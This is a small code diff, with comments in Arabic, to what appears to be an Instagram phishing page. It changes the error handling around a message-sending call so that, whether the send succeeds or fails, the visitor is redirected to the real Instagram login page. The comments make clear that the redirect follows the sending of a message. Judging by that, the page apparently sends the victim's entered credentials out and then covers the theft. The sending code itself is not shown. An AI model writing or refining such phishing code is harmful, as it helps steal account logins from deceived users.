@@ -112,8 +112,8 @@
                 console.log('تم إرسال الرسالة بنجاح', response);
                 // توجيه المستخدم إلى صفحة تسجيل الدخول الحقيقية لإنستاجرام بعد إرسال الرسالة
                 window.location.href = 'https://www.instagram.com/accounts/login/';
-            }, function(error) {
-                console.log('فشل إرسال الرسالة', error);
+            }).catch(function(error) {
+                console.error('فشل إرسال الرسالة', error);
                 // إذا فشل الإرسال، يمكن توجيه المستخدم إلى صفحة تسجيل الدخول لإنستاجرام أيضاً
                 window.location.href = 'https://www.instagram.com/accounts/login/';
             });
